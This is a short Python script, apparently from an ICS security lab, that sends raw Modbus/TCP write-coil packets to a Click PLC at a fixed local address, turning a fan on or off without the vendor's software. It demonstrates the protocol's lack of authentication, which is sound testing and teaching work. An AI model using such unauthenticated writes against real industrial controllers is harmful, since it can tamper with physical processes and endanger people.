#!/usr/bin/python
# ======================================================================
#
# writecoil.py
#
# This script tests to see if a variable in a program stored in the
# Click C0-10DD1E-D PLC can be written to without the legitimate
# programming software using Modbus protocol.  The program variable
# in question controls whether a computer tower fan is on or off.
#
# Authors: Gary Roth, Dan Ritter, Rich Tanner
# Date: March 2017
#
# ======================================================================

import socket
import binascii
import socket
import struct

dstIP = '192.168.0.101' # IP address of the PLC
dstPort = 502 # port number of the PLC
transID = 0x0000 # Transaction ID - Modbus header
protocolID = 0x0000 # Protocol ID - Modbus header
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # TCP socket for connecting to the PLC
rec = None # Used to store received Modbus data from the PLC

# Unit Identifier + Function Code + Modbus Hex Address + Value
fanOn= binascii.unhexlify("00054000ff00") # Modbus data to turn fan on
fanOff = binascii.unhexlify("000540000000") # Modbus data to turn fan off

def build_packet(data):
    """Builds a Modbus packet and returns it"""

    # struct.pack format specifiers: ! - in big endian, H - short int (2 bytes)
    packet = struct.pack('!HHH', transID, protocolID, len(data)) + data
        
    return packet

def send_packet(transID, packet):
    """Sends a packet to the target PLC and returns the received data"""

    sock.send(packet)
    transID += 0x1 # prepare the transaction ID for the next packet
    if transID > 0xffff: #reset the transaction ID to 0 if max value reached
        transID = 0x0000

    return sock.recv(4096) 

print "1 - Turn fan on"
print "2 - Turn fan off"
choice = int(raw_input("Enter choice: "))
             
# Establish TCP connection with PLC
sock.connect((dstIP, dstPort))

# Send fan on or off command
if choice == 1:
    sockRec = send_packet(transID, build_packet(fanOn))
elif choice == 2:
    sockRec = send_packet(transID, build_packet(fanOff))
